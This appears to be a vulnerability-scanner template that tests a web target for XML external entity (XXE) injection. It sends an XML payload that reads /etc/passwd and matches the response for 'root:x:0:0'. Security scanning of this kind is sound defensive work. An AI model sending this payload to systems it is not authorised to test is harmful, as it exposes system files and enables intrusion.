id: xxe-053
name: 'XXE via body'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via body'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      body:
        - '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'XXE_OK'
